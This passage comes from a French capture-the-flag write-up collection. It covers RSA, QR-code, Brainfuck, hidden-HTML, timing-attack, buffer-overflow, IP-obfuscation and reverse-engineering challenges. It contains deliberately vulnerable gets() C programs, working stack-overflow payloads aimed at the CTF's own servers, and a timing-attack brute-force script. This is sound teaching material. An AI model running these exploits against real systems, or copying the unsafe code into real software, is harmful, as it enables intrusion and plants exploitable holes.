phi = (p-1)*(q-1)
e = 17

ciphertext = pow(message, e, n) # 2790

### decrypt
p = 61
n = 3233
e = 17
ciphertext = 1632

q = n//p
phi = (p-1)*(q-1)
d = inverse(e, phi)
message = pow(ciphertext, d, n)
```

Pour la première question, il faut s'assurer tout d'abord que `p`et `q`sont des nombres premiers. Pour cela, on peut utiliser [factordb.com](http://factordb.com/). On apprend que ces derniers ne sont pas premiers car ils ont des diviseurs en plus de 1 et eux-mêmes. Il faut donc répondre `no` à cette première question.

Question suivante:

```bash
$ nc ctf.teamcryptis.fr 50004

########## Question 1 ##########
p=28423083049

q=28423083050

It is possible ? (yes/no) -> no

########## Question 2 ##########
p=94603

q=93187

It is possible ? (yes/no) ->
```

On a de nouvelles valeurs pour `p`et `q`, ces derniers sont bien premiers, il faudra donc répondre `yes`.

```bash
########## Question 2 ##########
p=94603

q=93187

It is possible ? (yes/no) -> yes
Value of 'n' ? ->
```

Cette fois il faudra renvoyer la valeur de `n` qui est le produit de `p`et `q`. On va directement utiliser l'interpréteur python, pour cela:

```bash
$ python3
>>> p = 94603
>>> q = 93187
>>> p * q
>>> 8815769761
```

Il faudra donc renvoyer `8815769761` afin de passer à la question suivante.

Les questions suivantes sont similaires...

Sur la question 7, le `plaintext` doit être passé en `hex`puis en `ascii`.

```bash
# version 1
$ python3
>>> import binascii
>>> plaintext = 561711819220594430501559128455193300454533528677678378623972820270701707955423938310925311883645
>>> binascii.unhexlify(hex(plaintext)[2:])
b'CRYPTIS{rsa_sp3cialist_since_26/03/2019}'
# [2:] pour retirer le '0x'
```

```bash
# version 2 (conseillée)
$ python3
>>> from Crypto.Util.number import long_to_bytes
>>> plaintext = 561711819220594430501559128455193300454533528677678378623972820270701707955423938310925311883645
>>> long_to_bytes(plaintext)
b'CRYPTIS{rsa_sp3cialist_since_24/09/2019}'
```

`CRYPTIS{rsa_sp3cialist_since_24/09/2019}`

# enc_050_quick_response_code

------

### Titre : Quick response code

### Points : 50

------

### Description

------

Scan me pls

------

### Réalisation

------

Le but de ce challenge est d'introduire le QRcode.

Pour réaliser ce challenge nous avons commencé par utiliser CyberChef pour obtenir le flag en binaire : 

```
CRYPTIS{N0t_s0_qu1ck_r3sp0ns3} -> 010000110101001001011001010100000101010001001001010100110111101101001110001100000111010001011111011100110011000001011111011100010111010100110001011000110110101101011111011100100011001101110011011100000011000001101110011100110011001101111101
```

Puis nous avons créé le QRcode contenant cette information

```bash
$ qr "010000110101001001011001010100000101010001001001010100110111101101001110001100000111010001011111011100110011000001011111011100010111010100110001011000110110101101011111011100100011001101110011011100000011000001101110011100110011001101111101" > code.png
```

------

### Résolution

------

Pour résoudre ce challenge, il faut d'abord lire le QRcode :

```bash
$ zbarimg -q code.png
QR-Code:010000110101001001011001010100000101010001001001010100110111101101001110001100000111010001011111011100110011000001011111011100010111010100110001011000110110101101011111011100100011001101110011011100000011000001101110011100110011001101111101
```

Puis, il suffit de décoder ce code binaire pour trouver le flag.

`CRYPTIS{N0t_s0_qu1ck_r3sp0ns3}`



# enc_050_wtf

------

### Titre : WTF

### Points : 50

------

### Description

------

++++[++++>---<]>.>-[--->+<]>---.+++++++.---------.++++.-----------.++++++++++.-[-->+++<]>.+[-->+<]>++++++++.[++>-------<]>.+[->+++<]>+.++++++++.-[-->+<]>--.-[->++<]>.-----.[--->+<]>.-----.[----->++<]>-.++++++++++++++.--[--->+<]>.[->+++++<]>++.+[--->++<]>++.---[----->+<]>-.[-->+<]>-----.---.-[----->+<]>--.[--->+<]>+++.

------

### Réalisation

Utilisation du site https://www.splitbrain.org/_static/ook/ pour créer le chiffré du message CRYPTIS{Fuck3d_up_my_Br41n}

------

### Résolution

------

Utilisation du même site pour retrouver le flag 

`CRYPTIS{Fuck3d_up_my_Br41n}`



# MISC_0150_Inutile_v4

------

### Titre : Inutile v4

### Points : 150

------

### Description

------

Affiche le flag

------

### Réalisation

Ce challenge consiste à mettre sur une page HTML plusieurs informations grâce à des GIFs, images, textes et ASCII art tout en dissimulant le flag.

Le flag est donné par un GIF créé sur ce site :
Il est dissimulé par un autre GIF.

L'ASCII art comporte un message contenant une flèche pointant vers un commentaire.
Ce dernier est en lien avec le texte dissimulé grâce à la modification de la couleur du paragraphe dans le code HTML.

Le site pour le message à l'envers : https://www.flipyourtext.com/
Le site pour le morse : https://md5decrypt.net/Code-morse/
Le site pour l'ASCII art : https://manytools.org/hacker-tools/convert-images-to-ascii-art/

------

### Résolution

------

Nous arrivons sur une page HTML contenant des images, GIFs et un ASCII art.
Ce dernier est une flèche pointant un GIF où on peut voir apparaître successivement des lettres et des accolades.
En décomposant ce GIF on s’aperçoit qu'il s'agissait d'un piège.

L'image en dessous de ce GIF nous incite à rechercher ce que l'on ne voit pas. En sélectionnant des choses au hasard sur la page, on finit par tomber sur un message. Le contenu du message comme il l'est est illisible. Un conseil nous est cependant donné, nous disant d'utiliser un miroir. En recherchant comment inverser le texte, on finit par apprendre que le secret est dissimulé quelque part, probablement dans l'ASCII art. 

En supprimant de ce dernier les caractères @*#, on finit par trouver un message nous indiquant de suivre la flèche. La flèche de ce message pointe vers le côté droit, mais n'affiche rien de particulier. 

Le GIF en haut à droite ne nous apporte aucune information.
Celui en dessous de lui, par contre, nous parle de commentaire. Un message en gris clair à côté nous demande si nous les avons lu. 

En recherchant alors les commentaires dans la page, on retrouve un message encodé, à l'envers lui aussi. Après l'avoir mis à l'endroit, on s'aperçoit qu'il s'agit d'un message en base 64. Après l'avoir décodé on est déçu; il ne s'agit pas du flag que l'on recherche.

En fouillant dans le code source on remarque cependant qu'au centre se trouvent 2 images, une n'étant pas affichée à cause de :

```html
style="display:none;"
```

En affichant la seconde image et en cachant la première, un GIF nous donnant le flag apparaît alors.

Il ne restait sur cette page que 2 images nous incitant à traduire le code morse donné, mais il s'agissait aussi d'un piège.

`CRYPTIS{u53l355_d15pl4y3d}`



# prog_0600_timing_attack

------

### Titre : Timing attack

### Points : 600

------

### Description

------

Connecte toi sur: `nc ctf.teamcryptis.fr 50017` afin de récupérer le flag.

------

### Réalisation

------

Le but de ce challenge est d'introduire le principe de timing attack.

> Une **timing attack** ou (attaque temporelle) consiste à estimer et analyser le temps mis pour effectuer certaines opérations dans le but de découvrir des informations.

Pour réaliser ce challenge nous avons créé un serveur qui demande à l'utilisateur de lui envoyer un flag et qui effectue une comparaison sur chaque caractère entre la réponse de l'utilisateur et le vrai flag. Si il y a une correspondance alors le serveur marque une petite pause avec un `sleep()`. Ainsi, plus l'utilisateur se rapprochera du bon flag et plus le serveur mettra de temps à répondre.

Le code utilisé pour le serveur est le suivant:

```python
#!/usr/bin/env python3

import socket, time, os

flag = open('FLAG.txt', 'rb').read().rstrip(b'\n')
flag_size = len(flag)

# configuration serveur
server_port = 50017
my_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
my_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
my_sock.bind(('', server_port))
my_sock.listen(socket.SOMAXCONN)

# la fonction importante
def challenge(pid, client_socket, client_tsap):
    print("Nouvelle connexion de: ", client_tsap)
    try:
        client_socket.sendall(b'Hello !\n')
        client_socket.sendall(b'Pour trouver le flag, tu vas devoir le deviner !\n')
        client_socket.sendall(f'Indice: sa taille est {flag_size} caractères .\n'.encode())
        client_socket.sendall(b'Bonne chance ;)\n')

        while 1:
            client_socket.sendall(b'FLAG: ')
            client_flag = client_socket.recv(1024).rstrip(b'\n')

            good_flag = 1
            for i in range(len(flag)):
                if i < len(client_flag) and client_flag[i] == flag[i]:
                    time.sleep(0.25)
                else:
                    good_flag = 0
                    break
            if good_flag == 1:
                client_socket.sendall(b'Bravo, tu peux valider le challenge avec ce flag !\n')
                break
            client_socket.sendall(b'Mauvais flag... \n')
    except(ConnectionResetError, BrokenPipeError):
        pass
    finally:
        print('Deconnection de: ', client_tsap)
        client_socket.close()

# simple main
def main():
    while 1:
        (client_socket, client_tsap) = my_sock.accept()
        pid = os.fork()
        if not pid:
            challenge(pid, client_socket, client_tsap)
    my_sock.close()

main()
```

------

### Résolution

------

Pour commencer, nous avons un serveur sur lequel il faut se connecter afin d'obtenir l'énoncé du challenge. Le serveur envoie des informations puis attend qu'on lui envoie un `flag`, cependant comment trouver ce fameux `flag` ?

```bash
$ nc ctf.teamcryptis.fr 50017
Hello !
Pour trouver le flag, tu vas devoir le deviner !
Indice: sa taille est 22 caractères .
Bonne chance ;)
FLAG: test
Mauvais flag... 
FLAG: 
```

En analysant le code source du serveur, on s'aperçoit qu'il **compare lettre à lettre** le flag qu'on lui transmet avec un flag présent dans `FLAG.txt`. On remarque également que lorsque la **comparaison est vraie**, le serveur effectue un `sleep(0.25)`, c'est à dire qu'il fait une petite **pause**. 

Dans notre cas la timing attack va être de trouver le bon flag en se basant sur **le temps de réponse du serveur**.

Le serveur nous a communiqué la taille que doit avoir le flag, nous allons donc construire pas à pas un mot de cette taille. Pour cela nous allons tester différents caractères possibles, attention le flag peut être constitué de **lettres** (majuscules + minuscules), de **chiffres** et de **symboles**. Afin de savoir quels caractères sont corrects, nous allons calculer le temps que prend le serveur à nous répondre après la soumission du mot que nous avons construit. Si le temps de réponse est supérieur ou égal à `0.25 * (i+1)` (`i` étant le nombre de caractères déjà trouvés) alors le caractère que nous sommes en train de tester est correct.

Le code suivant permet de résoudre le challenge:

```python
#!/usr/bin/env python3

import socket, string, time

my_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
my_sock.connect(("ctf.teamcryptis.fr", 50017))

msg = my_sock.recv(1024)
print(msg.decode())

charset = string.ascii_letters + string.digits + string.punctuation

flag = ''
for i in range(22):
    for c in charset:
        msg = my_sock.recv(1024)
        flag = flag[0:i] + c
        debut = time.time()
        my_sock.sendall(flag.encode() + b'\n')
        msg = my_sock.recv(1024)
        fin = time.time()
        delta = fin - debut
        if delta >= 0.25 * (i+1):
            print(f'{flag}')
            break
my_sock.close()
```

```bash
$ python3 resolv.py 
Hello !
Pour trouver le flag, tu vas devoir le deviner !

C
CR
CRY
CRYP
CRYPT
CRYPTI
CRYPTIS
CRYPTIS{
CRYPTIS{T
CRYPTIS{Ti
CRYPTIS{Tim
CRYPTIS{Tim3
CRYPTIS{Tim3_
CRYPTIS{Tim3_t
CRYPTIS{Tim3_t0
CRYPTIS{Tim3_t0_
CRYPTIS{Tim3_t0_S
CRYPTIS{Tim3_t0_Sl
CRYPTIS{Tim3_t0_Sl3
CRYPTIS{Tim3_t0_Sl33
CRYPTIS{Tim3_t0_Sl33P
CRYPTIS{Tim3_t0_Sl33P}
```

`CRYPTIS{Tim3_t0_Sl33P}`



# pwn_0200_overflow_1

---

### Titre : Overflow 1

### Points : 200

---

### Description

---

Connecte toi sur: `nc ctf.teamcryptis.fr 50046` et nourris un de mes amis qui a très très faim pour tenter de récupérer le flag. (1)

---

### Réalisation

---

Voici un programme en C qui va permettre a l'utilisateur de saisir ce qu'il veut et qui est vulnérable au `buffer overflow` .

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>

void win()
{
	printf("\nIl a assez mangé, bravo vous avez gagné !\n");
	char flag[256];
	FILE* f = fopen("./flag.txt", "r");
	if (f == NULL)
	{
		puts("Error: flag.txt not found\n");
		exit(0);
	}
	else
	{
		fgets(flag, sizeof(flag), f);
		printf("Voici votre flag:\n");
		printf("%s\n",flag);
		exit(0);
	}
}

void vuln()
{
	char buf[32];
	printf("Feed him>");
	gets(buf);
}

int main()
{
	setvbuf(stdout, NULL, _IONBF, 0);

	signal(SIGSEGV, win);

	vuln();
	return 0;
}
```

```bash
# compilation
$ gcc main.c -o overflow_1 -no-pie -fno-stack-protector -m32

# exécution
$ ./overflow_1 
Feed him>BBBBBBB
$
```

---

### Résolution

---

La fonction `gets` située dans la fonction `vuln()` rend vulnérable le programme au `buffer overflow` car elle ne possède pas de limite aux nombres de caractères entrés contrairement a `fgets` et on peut par consequent saisir un nombre de caractères supérieur à la taille du buffer. 

Cette vulnérabilité nous permettra d'écrire dans la pile afin de perturber l'éxécution du programme.  

Dans le cas de notre programme, on peut remarquer que celui ci va appeller la fonction `win()` des qu'il détectera  un `segmentation fault` signe qu'un buffer overflow est probablement passé par là.

Avec la fonction win(), on a le flag !

Notre buffer est de taille 32, tentons  d'écrire alors bien plus de caractères.

```bash
$ python -c "print 'A'*50"| nc ctf.teamcryptis.fr 50046 
Feed him>
Il a assez mangé, bravo vous avez gagné !
Voici votre flag:
CRYPTIS{I_l0ve_Buff3r_0v3rfl0w}
```

On a réussi notre buffer overflow en écrivant 50 caractères au lieu de 32.

Regardons cela un peu plus en detail avec un debogeur comme `gdb` .

```bash
$ gdb overflow_1
Reading symbols from overflow_1...(no debugging symbols found)...done.
(gdb) run <<<$(python -c "print 'A'*50")

Feed him>
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()

```

Avec `gdb` on peut voir que la cause de ce `segmentation fault`est en fait la réecriture d'une adresse présente sur la pile par nos propres caractères (`'A'=0x41` en héxadecimale).

Le programme ne connait bien évidemment pas cette nouvelle adresse et déclenche l'erreur.

Ce système "d'overwrite" d'adresse va être important pour la suite. 

`CRYPTIS{I_l0ve_Buff3r_0v3rfl0w}`

# pwn_0400_overflow_2

---

### Titre : Overflow 2

### Points : 400

---

### Description

---

Connecte toi sur: `nc ctf.teamcryptis.fr 50047` et nourris un de mes amis qui a très très faim pour tenter de récupérer le flag. (2)

---

### Réalisation

---

Voici un programme en C qui va permettre a l'utilisateur de saisir ce qu'il veut et qui est vulnérable au `buffer overflow` .

```c
#include <stdio.h>
#include <stdlib.h>

void win()
{
	printf("\nIl a assez mangé, bravo vous avez gagné !\n");	
	char flag[256];
	FILE* f = fopen("./flag.txt", "r");
	if (f == NULL)
	{
		puts("Error: flag.txt not found\n");
		exit(0);
	}
	else
	{
		//printf("Prout\n");
		fgets(flag, sizeof(flag), f);
		printf("Voici votre flag:\n");
		printf("%s\n",flag);
		
		exit(0);
	}
}

void vuln()
{
	char buf[32];
	printf("Feed him>");
	gets(buf);
}

int main()
{
	setvbuf(stdout, NULL, _IONBF, 0);
	vuln();
	return 0;
}
```

```bash
# compilation
$ gcc main.c -o overflow_2 -no-pie -fno-stack-protector -m32

# exécution
$ ./overflow_2
Feed him>BBBBBBB
$
```

---

### Résolution

---

Cette fois-ci il n'y a plus l'appel  automatique à la fonction `win` lors d'un segfault alors il va falloir se débrouiller par nous même pour appeller cette fonction et récupérer le flag.

On a vu précedemment que l'on pouvait réecrire des adresses dans la pile grâce au `buffer overflow` .

On va alors s'interesser au registre `Eip` . Ce registre est utilisé pour connaitre la prochaine instruction à executer.

 Lors de l'appel d'une fonction, `Eip` va enregistrer l'adresse de la prochaine instruction de la fonction afin d'y revenir par la suite. On a donc une `sauvegarde de l'Eip.`

Exemple avec notre programme :

```bash
   0x0804869e <+50>:	call   0x8048633 <vuln>
   0x080486a3 <+55>:	mov    $0x0,%eax
```

On est ici dans la fonction main et `Eip` va enregister l'adresse de la prochaine instruction afin d'y revenir apres la fin de la fonction vuln c'est a dire l'adresse `0x080486a3`

Par consequent quand la fonction `vuln` sera terminée c'est a dire quand son instruction `ret`sera appellée le programme va revenir a l'adresse pointée par `Eip` soit ``0x080486a3``pour reprendre le cours d'execution du programme.

Si on se place au niveau du `ret` de la fonction `vuln` donc juste avant sa fin et qu'on observe la pile alors on devra apercevoir la sauvegarde de l'`Eip` pour revenir a la fonction `main`.

```bash
Breakpoint 1, 0x0804866b in vuln ()
(gdb) x/24xw $esp
0xffffce9c:	0x080486a3	0xffffcec0	0x00000000	0x00000000
0xffffceac:	0xf7de4e81	0xf7fa4000	0xf7fa4000	0x00000000
0xffffcebc:	0xf7de4e81	0x00000001	0xffffcf54	0xffffcf5c
0xffffcecc:	0xffffcee4	0x00000001	0x00000000	0xf7fa4000
0xffffcedc:	0xf7fe575a	0xf7ffd000	0x00000000	0xf7fa4000
0xffffceec:	0x00000000	0x00000000	0x39fde610	0x7afce000

```

On remarque que notre adresse `0x080486a3`est bien ici et qu'elle est tout en haut de la pile étant donné que c'est la prochaine instruction.

Maintenant que l'on a compris le fonctionnement, on peut tres bien remplacer l'adresse contenue dans la sauvegarde de l'`Eip` par l'adresse de la fonction `win` par exemple avec notre `buffer overflow`.

Il faut savoir combien de caractères il va falloir entrer avant d'arriver jusqu'à cette adresse et la réécrire.

Pour cela on peut regarder le code assembleur au niveau de l'appel a `gets` :

```bash
 0x0804865a <+39>:	lea    -0x28(%ebp),%eax
 0x0804865d <+42>:	push   %eax
 0x0804865e <+43>:	call   0x80483f0 <gets@plt>
```

On remarque à la ligne 39 que l'adresse de début de notre buffer se trouve a `EBP-0x28` . Le buffer qui sera alloué aura donc une taille de 0x28=40 octets.

Il faut savoir que la sauvegarde de l'`Eip` se trouve toujours a `EBP+0x4`. Donc pour savoir le nombre de caractères à ecrire il suffit de faire 0x28+4= 44 caractères avant d'arriver a `Eip`.

Il nous reste juste à récuperer l'adresse de `win` avec gdb  :

```bash
(gdb) info func
All defined functions:

Non-debugging symbols:
0x080483a0  _init
0x080483e0  printf@plt
0x080483f0  gets@plt
0x08048400  fgets@plt
0x08048410  puts@plt
0x08048420  exit@plt
0x08048430  __libc_start_main@plt
0x08048440  setvbuf@plt
0x08048450  fopen@plt
0x08048460  __gmon_start__@plt
0x08048470  _start
0x080484b0  _dl_relocate_static_pie
0x080484c0  __x86.get_pc_thunk.bx
0x080484d0  deregister_tm_clones
0x08048510  register_tm_clones
0x08048550  __do_global_dtors_aux
0x08048580  frame_dummy
0x08048586  win
0x08048633  vuln
0x0804866c  main
```

On peut maintenant écrire notre payload `'A'*offset+win adress` et obtenir le flag.



```bash
$ python -c "print 'A'*44+'\x86\x85\x04\x08'"| nc ctf.teamcryptis.fr 50047 
Feed him>
Il a assez mangé, bravo vous avez gagné !
Voici votre flag:
CRYPTIS{0v3rFl0w_f0r_Win}
```



`CRYPTIS{0v3rFl0w_f0r_Win}`

# pwn_0600_overflow_3

---

### Titre : Overflow 3

### Points : 600

---

### Description

---

Connecte toi sur: `nc ctf.teamcryptis.fr 50048` et nourris un de mes amis qui a très très faim pour tenter de récupérer le flag. (3)

---

### Réalisation

---

Voici un programme en C qui va permettre a l'utilisateur de saisir ce qu'il veut et qui est vulnérable au `buffer overflow` .

```c
#include <stdio.h>
#include <stdlib.h>

void win(int arg1, int arg2)
{
	if (arg1 != 0xDEADBEEF || arg2 != 0xF00DB4BE)
	{
		puts("\nIl a encore faim mais vous y êtes presque !");
		exit(1);
	}

	printf("\nIl a assez mangé, bravo vous avez gagné !\n");
	char flag[256];
	FILE* f = fopen("./flag.txt", "r");
	if (f == NULL)
	{
		puts("ERROR: flag.txt not found\n");
	}
	else
	{
		fgets(flag, sizeof(flag), f);
		printf("Voici votre flag:\n");
		printf("%s\n",flag);
	}
}

void vuln()
{
	char buf[32];
	printf("Feed him>");
	gets(buf);
}

int main()
{
	setvbuf(stdout, NULL, _IONBF, 0);
	vuln();
	return 0;
}
```

```bash
# compilation
$ gcc main.c -o overflow_3 -no-pie -fno-stack-protector -m32

# exécution
$ ./overflow_3
Feed him>BBBBBBB
$
```

---

### Résolution

---

La différence avec le programme précédent est l'ajout de deux arguments dans la fonction 

`win`  .

Ce challenge sert juste à comprendre comment sont passés les arguments d'une fonction.

On a vu précedemment que l'on pouvait réecrire des adresses dans la pile grâce au `buffer overflow` .

On comprend ici qu'il va falloir ecrire les deux arguments  `0xDEADBEEF` et `0xF00DB4BE` apres l'appel a la fonction `win` pour obtenir le flag.

Notre payload précédent ressemblait à `'A'*offset+win address`.

Pour ce programme là notre payload sera similaire mais en rajoutant un padding et les deux arguments.

On aura donc `'A'*offset +saveEIP(win)+padding de 4 caracteres+argument1+argument2`

Pour savoir comment calculer l'offset et avoir l'adresse de win regarder le writeup de `overflow 2`.

En pratique notre payload ressemble à ceci :

`'A'*44+'\x86\x85\x04\x08'+'A'*4+'\xef\xbe\xad\xde'+''\xbe\xb4\x0d\xf0'`



On peut donc maintenant écrire notre payload  et obtenir le flag.

```bash
$ python -c "print 'A'*44+'\x86\x85\x04\x08'+'A'*4+'\xef\xbe\xad\xde'+'\xbe\xb4\x0d\xf0'"|nc ctf.teamcryptis.fr 50048
Feed him>
Il est mort, bravo vous avez gagné !
Voici votre flag:
CRYPTIS{0v3rFl0w_1s_a_g00d_vUln}

```



`CRYPTIS{0v3rFl0w_1s_a_g00d_vUln}`

# res_0300_offuscation

------

### Titre : Offuscation

### Points : 300

------

### Description

------

Connecte toi sur: `nc ctf.teamcryptis.fr 50018` afin de récupérer le flag.

------

### Réalisation

------

Le but de ce challenge est d'introduire le concept d'**IP Obfuscation**.

Pour ce challenge nous avons réalisé un serveur qui demande une adresse afin d'envoyer le flag à cette même adresse sur le port 8888. Cependant ce serveur filtre les adresses au format IP classique comme par exemple `192.168.1.12`.

```python
#!/usr/bin/env python3

import socket, os, re
import subprocess as sp

flag = open('FLAG.txt', 'r').read().rstrip('\n')

# configuration serveur
server_port = 50018
my_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
my_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
my_sock.bind(('', server_port))
my_sock.listen(socket.SOMAXCONN)

def challenge(pid, client_socket, client_tsap):
    print("Nouvelle connexion de:", client_tsap)
    try:
        client_socket.sendall(b'Hello !\n')
        client_socket.sendall(b'Donne moi ton adresse et attends moi sur ton port 8888 :)\n')
        
        while 1:
            client_socket.sendall(b'IP: ')
            client_ip = client_socket.recv(1024).rstrip(b'\n').decode().replace(' ', '')
            match = re.match(r"(.*)\.(.*)\.(.*)\.(.*)", client_ip)
            if match:
                client_socket.sendall(b'Mais... ceci est une adresse IP :(\n')
            else:
                # envoi du flag sur le port 8888 du client
                client_socket.close()
                break
    except(ConnectionResetError, BrokenPipeError):
        pass
    finally:
        print('Deconnection de:', client_tsap)
        client_socket.close()

def main():
    while 1:
        (client_socket, client_tsap) = my_sock.accept()
        pid = os.fork()
        if not pid:
            challenge(pid, client_socket, client_tsap)
    my_sock.close()

main()
```

------

### Résolution

------

Pour commencer, nous avons un serveur sur lequel il faut se connecter afin d'obtenir l'énoncé du challenge. Le serveur nous demande alors de lui donner notre adresse afin qu'il nous envoie le flag sur le port `8888`. Naturellement nous lui envoyons notre adresse IP. Cependant le serveur ne l'accepte pas...

```bash
$ nc localhost 50018
Hello !
Donne moi ton adresse et attends moi sur ton port 8888 :)
IP: 192.168.1.12
Mais... ceci est une adresse IP :(
```

Le code du serveur étant fourni, nous pouvons l'étudier afin de comprendre comment il décide de la validité de l'adresse fournie. De là on se rend compte qu'il utilise l'expression régulière suivante: `(.*)\.(.*)\.(.*)\.(.*)` et qu'il rejette toutes les adresses correspondant à celle-ci.

Le but est alors de trouver un moyen d'envoyer notre adresse IP au serveur sans qu'il la rejette. C'est alors qu'intervient le principe d'**IP Obfuscation**. Ce dernier permet d'écrire une adresse IP sous une autre forme que sa forme classique. Après une rapide recherche on tombe sur des sites tels que : [vinx.tuxfamily.org/ioc.html](http://vinx.tuxfamily.org/ioc.html) qui permettent de réaliser de l'IP Obfuscation.

Ici, le format à sélectionner est le format **Dword** puisqu'il ne correspond pas au schéma de l'expression régulière utilisée par le serveur. En envoyant notre adresse avec le format Dword, le serveur l'accepte et nous récupérons le flag sur le port `8888` à l'aide d'un `socat` préalablement lancé en écoute sur le port en question.

```bash
$ nc ctf.teamcryptis.fr 50018
Hello !
Donne moi ton adresse et attends moi sur ton port 8888 :)
IP: 192.168.1.12
Mais... ceci est une adresse IP :(
IP: 3232235788
Bravo ! Tu as bien dissimule ton adresse petit malin ;)
Si c'est bien ton adresse, le flag t'attend sur ton port 8888 !
```

```bash
$ socat tcp-listen:8888,reuseaddr -
Tu peux valider avec: CRYPTIS{0bfUsC4t10n}
```

`CRYPTIS{0bfUsC4t10n}`



# reverse_0200_reverse_1

---

### Titre : Reverse 1

### Points : 200

---

### Description

---

Reverse me if you can :)

---

### Réalisation

---

Nous allons écrire un programme en C qui, une fois lancé, va demander à l'utilisateur de lui fournir une certaine chaîne de caractères, cette chaîne correspondra au flag du challenge : `CRYPTIS{easy_reverse_flag}`.

```c
cat main.c 
#include <stdio.h>
#include <string.h>

int main() {
  
  char input[100];
  char *a = "Bonjour";
  char *b = "Ce challenge est trop facile";
  char *flag = "CRYPTIS{easy_reverse_flag}";
  char *c = "Je ne sais plus trop quoi écrire";
  char *d = "Bon j'arrête";
  
  printf("Give me the flag: ");
  scanf("%s", input);

  int i = 0;
  if (strlen(input) == 26) { 
    i = 0;
    while (input[i] != '\0' && flag[i] != '\0') {
      if (input[i] != flag[i]) {
        break;
      }
      i++;
    }
  }

  if (i == strlen(input) && i == strlen(flag)) {
    printf("Congratulation, you can validate the challenge with this flag :)\n");
  } else {
    printf("Bad flag, try again :(\n");
  }
  
  return 0;
}
```

```bash
# compilation
$ gcc main.c -o reverse_me_1

# exécution
$ ./reverse_me_1
Give me the flag: GneuGneuGneu
Bad flag, try again :(
```

---

### Résolution

---

Regardons d'abord le type du fichier fourni pour ce challenge. Pour cela nous utilisons la commande Linux `file`.

> `file` — determine file type

```bash
# type de fichier
$ file ./reverse_me_1
reverse_me_1: ELF 64-bit LSB shared object, x86-64,...
```

Ce fichier est donc un exécutable pour Linux (`ELF`: Linux, `PE` : Windows).

```bash
# exécution
$ chmod +x ./reverse_me_1
$ ./reverse_me_1
Give me the flag: GneuGneuGneu
Bad flag, try again :(
```

On peut donc penser que si on fourni le bon flag, celui-ci sera accepté par le programme.

Pour commencer, nous allons utiliser la commande `strings` afin de peut-être trouver le flag.

> `strings` - find the printable strings in a object, or other binary, file

```bash
$ strings reverse_me_1
...
CRYPTIS{easy_reverse_flag}
...
```

Dans les résultats de la commande, on peut voir le flag.

En utilisant la commande `grep`nous pouvons filtrer les lignes en sortie avec un pattern.

> `grep, egrep, fgrep, rgrep` - print lines matching a pattern

```bash
$ strings reverse_me_1 | grep "CRYPTIS"
CRYPTIS{easy_reverse_flag}
```

Avec le `| grep "CRYPTIS"`, une ligne peut s'afficher si et seulement si elle contient le mot `CRYPTIS`. Ce sont les premières lettres du flag que l'on cherche.

`CRYPTIS{easy_reverse_flag}`

# reverse_0400_reverse_2

---

### Titre : Reverse 2

### Points : 400

---

### Description

---

Reverse me if you can :)

---

### Réalisation

---

Ce challenge est une suite au challenge `reverse_0200_reverse_1`. Il suit le même principe, sauf qu'au lieu de stocker le flag dans une chaîne de caractères en dur dans le code, nous allons stocker les valeurs ASCII de chaque lettre du flag dans un `char flag[]`. Cela permet d'empêcher à la commande `strings`d'afficher notre flag en clair.

Nous utilisons ce script python afin de trouver les valeurs ASCII associées à notre flag `CRYPTIS{ascii_everywhere}`.

```bash
$ python3
>>> flag = 'CRYPTIS{ascii_everywhere}'
>>> for c in flag:
...     print(ord(c), end=' ')
... 
67 82 89 80 84 73 83 123 97 115 99 105 105 95 101 118 101 114 121 119 104 101 114 101 125
```

Nous remplissons donc la tableau `char flag[]` avec les valeurs ASCII du flag et en pensant à ajouter un `0` à la fin pour terminer la chaîne.

```c
#include <stdio.h>
#include <string.h>

int main() {
  
  char input[100];
  char *a = "Re-Bonjour";
  char *b = "Ce challenge est un peu moins facile";
  char flag[] = {67, 82, 89, 80, 84, 73, 83, 123, 97, 115, 99, 105, 105, 95, 101, 118, 101, 114, 121, 119, 104, 101, 114, 101, 125, 0};
  char *c = "Bon chance";
  char *d = "Good luck";
  char *e = "<3";
  
  printf("Give me the flag: ");
  scanf("%s", input);

  int i = 0;
  if (strlen(input) == 25) {
    while (input[i] != '\0' && flag[i] != '\0') {
      if ((int)input[i] != flag[i]) {
        break;
      }
      i++;
    }
  }

  if (i == strlen(input) && i == 25) {
    printf("Congratulation, you can submit this flag :)\n");
  } else {
    printf("Bad flag, try again :(\n");
  }
  
  return 0;
}
```

```bash
# compilation
$ gcc main.c -o reverse_me_2

# exécution
$ ./reverse_me_2
Give me the flag: GneuGneuGneu
Bad flag, try again :(
```

---

### Résolution

---

On commence comme pour le `reverse_0200_reverse_1` avec la commande `file` pour connaitre le type de fichier.

```bash
$ file ./reverse_me_2
reverse_me_1: ELF 64-bit LSB shared object, x86-64,...
```

On a donc encore un exécutable pour Linux. Maintenant, utilisons la commande `strings`.

```bash
$ strings ./reverse_me_2 | grep "CRYPTIS"
```

C'est triste, il n'y a aucun résultat. Nous allons donc maintenant utiliser un programme afin d'explorer notre `reverse_me_2`. Nous utiliserons `radare2`. Pout le lancer, il suffit de lui donner notre `reverse_me_2`en paramètre.

```bash
$ r2 ./reverse_me_2
[0x000006a0]>
```

On se retouve maintenant, dans l'interpréteur de `radare2`.

L'étape suivante est d'analyser `reverse_me_2` avec la commande `aaa` puis d'afficher les fonctions trouvées  avec la commande `afl`.

```bash
# on lance une analyse du binaire
[0x000006a0]> aaa

# on affiche les fonctions du binaire
[0x000006a0]> afl
0x00000000    3 72   -> 73   sym.imp.__libc_start_main
0x00000618    3 23           sym._init
0x00000640    1 6            sym.imp.puts
0x00000650    1 6            sym.imp.strlen
0x00000660    1 6            sym.imp.__stack_chk_fail
0x00000670    1 6            sym.imp.printf
0x00000680    1 6            sym.imp.__isoc99_scanf
0x00000690    1 6            sub.__cxa_finalize_248_690
0x000006a0    1 43           entry0
0x000006d0    4 50   -> 40   sym.deregister_tm_clones
0x00000710    4 66   -> 57   sym.register_tm_clones
0x00000760    4 49           sym.__do_global_dtors_aux
0x000007a0    1 10           entry1.init
0x000007aa   15 526          main
0x000009c0    4 101          sym.__libc_csu_init
0x00000a30    1 2            sym.__libc_csu_fini
0x00000a34    1 9            sym._fini
```

